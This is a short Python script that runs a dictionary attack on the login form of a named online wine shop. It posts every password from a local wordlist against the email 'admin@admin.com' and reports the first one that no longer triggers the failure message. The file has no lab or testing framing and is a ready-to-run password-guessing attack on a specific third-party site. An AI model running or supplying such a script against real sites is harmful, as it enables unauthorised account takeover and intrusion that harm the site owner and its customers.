import requests
import time


target_url = "https://www.shopwinedirect.com/login.php?action=check_login"
data_dict = {"login_email": "admin@admin.com", "login_pass": "", "Login": "submit"}
with open("/home/nole19/Downloads/passwords.txt", "r") as wordlist_file:
    for line in wordlist_file:
        word = line.strip()
        data_dict["login_pass"] = word
        response = requests.post(target_url, data=data_dict)
        time.sleep(1)
        if "Your email address or password is incorrect" not in response.content.decode():
            print("[+] Got the password --> " + word)
            exit()


print("Reached end of the line")
